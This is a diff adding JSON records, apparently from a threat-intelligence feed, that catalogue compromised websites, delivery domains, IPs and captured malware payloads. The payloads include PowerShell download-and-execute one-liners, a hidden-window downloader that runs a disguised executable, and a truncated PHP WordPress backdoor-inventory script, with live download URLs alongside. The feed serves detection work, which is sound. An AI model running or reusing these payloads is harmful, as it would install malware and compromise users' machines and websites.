+    "PayloadUrl": [],
+    "IP": [
+      "67.20.99.105"
+    ],
+    "Related": [],
+    "Payload": "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
+    "ResolvedDownloadUrl": [
+      "https://fastly.jsdelivr.net/gh/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa"
+    ],
+    "ReportId": "cmw8twaul23bu0omlsfsgkias"
+  },
+  {
+    "UrlDomain": "www.esteticadamar.it",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "89.46.107.243"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803"
+    ],
+    "ReportId": "cmw8tvf9t236w0omlli0mmgpj"
+  },
+  {
+    "UrlDomain": "muladentalclinic.com",
+    "DeliveryUrl": [
+      "likingdropout.site",
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "162.241.217.231"
+    ],
+    "Related": [],
+    "Payload": "$tok='cGp97BoHYdZxRBlWC1NBdcV_XMeGMWQwlnFG7qSQXFc';$id='64980c0efd83dc4b';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
+    "ResolvedDownloadUrl": [],
+    "ReportId": "cmw8tokv922us0omlidqlq47p"
+  },
+  {
+    "UrlDomain": "copro.shop",
+    "DeliveryUrl": [
+      "frclau.com"
+    ],
+    "PayloadUrl": [
+      "https://frclau.com/eoN"
+    ],
+    "IP": [
+      "77.37.53.27"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://frclau[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://frclau.com/eoN"
+    ],
+    "ReportId": "cmw8tl5kz22nz0omlh7329rch"
+  },
+  {
+    "UrlDomain": "spinalorthodontist.com",
+    "DeliveryUrl": [
+      "t-trustresnew.com"
+    ],
+    "PayloadUrl": [
+      "https://t-trustresnew.com/Girya/3b31fa31ebcf3fd6"
+    ],
+    "IP": [
+      "160.153.0.36"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://t-trustresnew[.]com/Girya/3b31fa31ebcf3fd6')|iex",
+    "ResolvedDownloadUrl": [
+      "https://t-trustresnew.com/Girya/3b31fa31ebcf3fd6"
+    ],
+    "ReportId": "cmw8tggq722ht0omlj3uf6yqr"
+  }
+]
